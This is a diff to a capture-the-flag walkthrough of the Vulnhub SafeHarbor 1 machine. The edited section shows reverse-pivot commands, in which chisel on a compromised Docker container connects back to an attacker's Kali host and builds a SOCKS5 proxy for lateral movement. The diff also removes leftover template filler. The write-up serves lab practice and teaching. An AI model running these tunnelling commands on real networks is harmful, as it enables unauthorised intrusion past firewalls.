@@ -271,7 +271,7 @@ Outside  :80 |<--->                                      reverse connect)       
              |                                                                  |
 ```
 
-In situations where there are no SSH or other ways to tunnel the traffic, we could use reverse pivot. The victim machine (client) will connect back (reverse) to the attacker machine (server) and then open a tunnel to route the traffic to the destination server(MySQL) and port. 
+During real world red team engagements we are often faced with challenges like this, there is no SSH or firewall restricts all inbound connections except for web ports (80 or 443). We have to heavily rely on reverse connections, and that's why we will be using reverse pivot! The victim machine (client) will connect back (reverse) to the attacker machine (server) and then open a tunnel to route the traffic to the destination server(MySQL) and port. 
 
 There are quite a lot of tools that comes to my mind for such a situation. Listing them below for your reference:
 
@@ -323,7 +323,7 @@ Now, let's go ahead and connect to MySQL and see what's in the database for us:
 ![mysql_connect](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.gif)
 
 
-I spent quite a lot of time reading the chisel manual page and when I checked the open issues for the project "reverse proxy" is a feature request. But unfortunately, the chisel client does not support socks5 server (I mean, makes sense it's a client?)
+I spent quite a lot of time reading the chisel manual page and when I checked the open issues for the project "reverse proxy" is a feature request. Unfortunately, the chisel client does not support socks5 server (I mean, makes sense it's a client right?)
 
 What we did earlier was reverse connect the docker container to our attacker machine and tunnel traffic for a specific port. For us to expand our attack surface and laterally move I would need a socks proxy or something similiar.
 
@@ -335,75 +335,33 @@ Reading through the open issues, a comment from one of the user shows a complica
 ./chisel_linux_amd64 server -p 9000 --reverse -v
 ```
 
-Instead of tmux, I decided to run the processes in background.
-
 **On the victim machine run:**
 
 ```sh
-$ chisel client -v http://192.168.128.49:9000 R:127.0.0.1:14000:127.0.0.1:18000 &
-$ chisel server -p 62000 --host 127.0.0.1 --socks5 -v &
-$ chisel client -v http://127.0.0.1:62000 127.0.0.1:18000:socks &
+./chisel client -v http://192.168.1.22:9000 R:127.0.0.1:14000:127.0.0.1:18000 &
+./chisel server -p 62000 --host 127.0.0.1 --socks5 -v &
+./chisel client -v http://127.0.0.1:62000 127.0.0.1:18000:socks &
 ```
 
-Let me explain the sequence here:
+![chisel_socks_1](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_6.png)
+
+Here's the background of what we performed in the above steps.
 
 - [Docker container] reverse connects to [Kali VM] on port 9000
-- chisel client on [Docker container] traffic between [Kali VM] 14000 and [Docker container] 18000
-- chisel server on [Docker container] creates socks5 server on port 62000
-- chisel client on [Docker container] tunnels traffic between port 18000 and socks5 proxy listening on [Docker container] on 62000
+- chisel client [Docker container] tunnels traffic between [Kali VM] 14000 and [Docker container] 18000
+- chisel server [Docker container] creates socks5 server on port 62000
+- chisel client [Docker container] tunnels traffic between port 18000 and socks5 proxy listening on [Docker container] 62000
 - This creates a socks5 proxy between [Kali VM] and [Docker container] R:127.0.0.1:1:14000=>127.0.0.1:18000 (R indicates remote)
 
 ```
 [Docker container]--> reverse connect 9000:[Kali VM]:14000 <==> [Docker container] chisel-client 127.0.0.1:18000 ==> [Docker container] socks5 127.0.0.1:62000
 ```
 
-```
-/home/www-data $ ./chisel client -v http://192.168.128.49:9000 R:127.0.0.1:14000:127.0.0.1:18000 &
-/home/www-data $ 2019/10/17 20:28:34 client: Connecting to ws://192.168.128.49:9000
-2019/10/17 20:28:34 client: Handshaking...
-2019/10/17 20:28:34 client: Fingerprint 4d:5f:fc:a1:37:2d:e9:9e:c4:4e:f9:99:19:5f:c4:8e
-2019/10/17 20:28:34 client: Sending config
-2019/10/17 20:28:34 client: Connected (Latency 810.6µs)
-
-/home/www-data $ ./chisel server -p 62000 --host 127.0.0.1 --socks5 -v &
-/home/www-data $ 2019/10/17 20:28:41 server: SOCKS5 server enabled
-2019/10/17 20:28:41 server: Fingerprint d4:d8:a4:b5:1e:7d:8b:ca:0f:4e:6d:09:5f:6d:4c:61
-2019/10/17 20:28:41 server: Listening on 127.0.0.1:62000...
-
-/home/www-data $ ./chisel client -v http://127.0.0.1:62000 127.0.0.1:18000:socks &
-/home/www-data $ 2019/10/17 20:28:47 client: Connecting to ws://127.0.0.1:62000
-2019/10/17 20:28:47 client: proxy#1:127.0.0.1:18000=>socks: Listening
-2019/10/17 20:28:47 server: session#1: Handshaking...
-2019/10/17 20:28:47 client: Handshaking...
-2019/10/17 20:28:48 client: Fingerprint d4:d8:a4:b5:1e:7d:8b:ca:0f:4e:6d:09:5f:6d:4c:61
-2019/10/17 20:28:48 server: session#1: Verifying configuration
-2019/10/17 20:28:48 client: Sending config
-2019/10/17 20:28:48 server: session#1: Open
-2019/10/17 20:28:48 client: Connected (Latency 1.321291ms)
-2019/10/17 20:29:39 client: conn#1: [1/1]: Open
-2019/10/17 20:29:39 client: proxy#1:127.0.0.1:18000=>socks: conn#1: Open
-2019/10/17 20:29:39 server: session#1: socksconn#1: {%!s(int32=1) %!s(int32=1)} Opening
-2019/10/17 20:29:39 client: proxy#1:127.0.0.1:18000=>socks: conn#1: Close (sent 88B received 2.32KB)
-```
-
 On the Kali machine you should see the connection established:
 
-```
-root@kali:/tmp# ./chisel_linux_amd64 server -p 9000 --reverse -v
-2019/10/17 16:25:26 server: Reverse tunnelling enabled
-2019/10/17 16:25:26 server: Fingerprint 4d:5f:fc:a1:37:2d:e9:9e:c4:4e:f9:99:19:5f:c4:8e
-2019/10/17 16:25:26 server: Listening on 0.0.0.0:9000...
-2019/10/17 16:28:34 server: session#1: Handshaking...
-2019/10/17 16:28:34 server: session#1: Verifying configuration
-2019/10/17 16:28:34 server: session#1: Open
-2019/10/17 16:28:34 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: Listening
-2019/10/17 16:29:39 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: conn#1: Open
-2019/10/17 16:29:39 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: conn#1: Close (sent 88B received 2.32KB)
-2019/10/17 16:29:42 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: conn#2: Open
-2019/10/17 16:29:42 server: proxy#1:R:127.0.0.1:14000=>127.0.0.1:18000: conn#2: Close (sent 88B received 1.75KB)
-```
+![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_7.png)
 
-Phew! That was a bit complex but let's see if the socks proxy works. 
+Phew! That was a bit complex but let's see if the socks proxy works. Let's check if 
 
 ```
 root@kali:~# netstat -antp | grep 14000
@@ -424,124 +382,11 @@ root@kali:~# tail /etc/proxychains.conf
 # defaults set to "tor"
 socks5 127.0.0.1 14000
 ```
+Quickly testing the socks5 proxy connectivity, let's do a curl on the target web server and a quick full TCP scan for port 80 on limited hosts.
+
+![reverse_shell_gif](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.gif)
 
 
-
-There should be whitespace between paragraphs.
-
-There should be whitespace between paragraphs. We recommend including a README, or a file with information about your project.
-
-# [](#header-1)Header 1
-
-This is a normal paragraph following a header. GitHub is a code hosting platform for version control and collaboration. It lets you and others work together on projects from anywhere.
-
-## [](#header-2)Header 2
-
-> This is a blockquote following a header.
->
-> When something is important enough, you do it even if the odds are not in your favor.
-
-### [](#header-3)Header 3
-
-```js
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
-}
-```
-
-```ruby
-# Ruby code with syntax highlighting
-GitHubPages::Dependencies.gems.each do |gem, version|
-  s.add_dependency(gem, "= #{version}")
-end
-```
-
-#### [](#header-4)Header 4
-
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-
-##### [](#header-5)Header 5
-
-1.  This is an ordered list following a header.
-2.  This is an ordered list following a header.
-3.  This is an ordered list following a header.
-
-###### [](#header-6)Header 6
-
-| head1        | head two          | three |
-|:-------------|:------------------|:------|
-| ok           | good swedish fish | nice  |
-| out of stock | good and plenty   | nice  |
-| ok           | good `oreos`      | hmm   |
-| ok           | good `zoute` drop | yumm  |
-
-### There's a horizontal rule below this.
-
-* * *
-
-### Here is an unordered list:
-
-*   Item foo
-*   Item bar
-*   Item baz
-*   Item zip
-
-### And an ordered list:
-
-1.  Item one
-1.  Item two
-1.  Item three
-1.  Item four
-
-### And a nested list:
-
-- level 1 item
-  - level 2 item
-  - level 2 item
-    - level 3 item
-    - level 3 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-
-### Small image
-
-![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)
-
-### Large image
-
-![](https://guides.github.com/activities/hello-world/branching.png)
-
-
-### Definition lists can be used with HTML syntax.
-
-<dl>
-<dt>Name</dt>
-<dd>Godzilla</dd>
-<dt>Born</dt>
-<dd>1952</dd>
-<dt>Birthplace</dt>
-<dd>Japan</dd>
-<dt>Color</dt>
-<dd>Green</dd>
-</dl>
-
-```
-Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
-```
-
-```
-The final element.
-```
 
 **References:**
 
